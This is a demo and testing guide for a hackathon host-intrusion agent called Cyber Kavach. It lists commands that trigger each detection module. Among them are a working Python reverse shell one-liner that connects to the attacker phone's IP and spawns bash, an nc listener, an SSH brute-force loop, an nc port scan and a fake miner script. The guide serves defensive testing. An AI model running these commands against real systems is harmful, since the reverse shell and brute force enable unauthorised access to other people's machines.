# Cyber Kavach — Demo Commands & Testing Guide

This guide contains the exact commands used to trigger each module in the Cyber Kavach agent for live hackathon demonstration purposes.

> **💡 Important IP Considerations:**
> - Below, `10.212.16.127` represents the **Laptop's Wi-Fi IP** (Where Cyber Kavach is running).
> - `10.212.16.72` represents the **Phone's Wi-Fi IP** (The attacker device).
> - Adjust these IP addresses if your Wi-Fi assigns you different IPs on the day of the hackathon!

---

## 1. 🍯 Honeypot (Deception Technology)
**Goal:** Trap an attacker trying to scan open administration ports and auto-ban their IP.

**📱 Run on PHONE (Attacker):**
```bash
# 1. Connect to the fake FTP trap port on the laptop
nc 10.212.16.127 2121

# 2. Once the server says "220 vsFTPd...", type any payload to trigger it:
USER admin
```

**🛡️ Expected Result:** Agent fires a `deception_alert` and permanently bans the phone's IP via `iptables`.

---

## 2. 🔐 Privilege Escalation (PrivEsc)
**Goal:** Detect unauthorized password brute-forcing of `su`/`sudo` or direct tampering with identity files.

**💻 Run on LAPTOP (Victim / Local Insider Threat):**
**Method A (Failed Auth):**
```bash
# Try to switch to root user
su root
# (When prompted for a password, type random gibberish and hit Enter)
```

**Method B (File Tampering):**
```bash
# Touch the password file to fake an unauthorized modification timestamp
sudo touch /etc/passwd
```

**🛡️ Expected Result:** Agent logs the failed auth or file change, firing an immediate `privilege_escalation` alert.

---

## 3. ⛏️ Cryptominer Auto-Kill
**Goal:** Catch and kill processes hiding under known miner names that actively hog CPU power.

**💻 Run on LAPTOP (Victim):**
```bash
# 1. Create a fake infinite loop script named after a known miner
cat << 'EOF' > xmrig.sh
#!/bin/bash
while true; do :; done
EOF
chmod +x xmrig.sh

# 2. Run the script in the background to spike CPU usage to 100%
./xmrig.sh --pool stratum+tcp://monero.crypto.com &
```

**🛡️ Expected Result:** After 20 seconds of scanning, the agent spots `xmrig.sh` hitting ~100% CPU and neutralizes it via `SIGKILL`.

---

## 4. 🔗 Reverse Shell Detection
**Goal:** Detect bash/python/nc processes that make outbound internet connections on non-standard ports, and kill them.

**📱 Run on PHONE (Attacker):**
```bash
# Set up a listener on your phone to catch the shell
nc -lvnp 4444
```

**💻 Run on LAPTOP (Victim):**
```bash
# Bypass terminal hooks and securely spawn an outgoing shell to your phone's IP
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.212.16.72",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**🛡️ Expected Result:** The shell connects momentarily, but the agent catches the established socket and kills the python/bash process, disconnecting your phone. (It then blocks the phone's IP).

---

## 5. 🔓 SSH Brute Force
**Goal:** Block repeated failed SSH login attempts from an external device.

**📱 Run on PHONE (Attacker):**
```bash
# Fast-loop 10 failed login attempts into the laptop
for i in {1..10}; do ssh tester@10.212.16.127 -o ConnectTimeout=1 -o PasswordAuthentication=no; done
```

**🛡️ Expected Result:** Once the limit (5 failed attempts) is reached within the `auth.log`, the agent invokes `responder.py` and bans the phone's IP.

---

## 🌐 6. Network Anomaly (Port Scan)
**Goal:** Detect aggressive reconnaissance scanning from a remote IP.

**📱 Run on PHONE (Attacker):**
```bash
# Scan a rapid chunk of ports on the laptop
nc -z -w 1 10.212.16.127 1-100
```

**🛡️ Expected Result:** The `ss -tnp` parser registers `10.212.16.72` touching multiple distinct local ports in a rapid window, firing a `network_anomaly` alert.

---

## 🛑 How to Unban Your Phone!
Because these active responses use `iptables`, testing them will result in your phone being blocked from making further connections to your laptop!

**To clear the blocks and test the next module, run this on your LAPTOP:**
```bash
# 1. List all active firewall blocks
sudo iptables -L INPUT -n --line-numbers

# 2. Delete a specific rule by its number (e.g. block rule #1)
sudo iptables -D INPUT 1
```
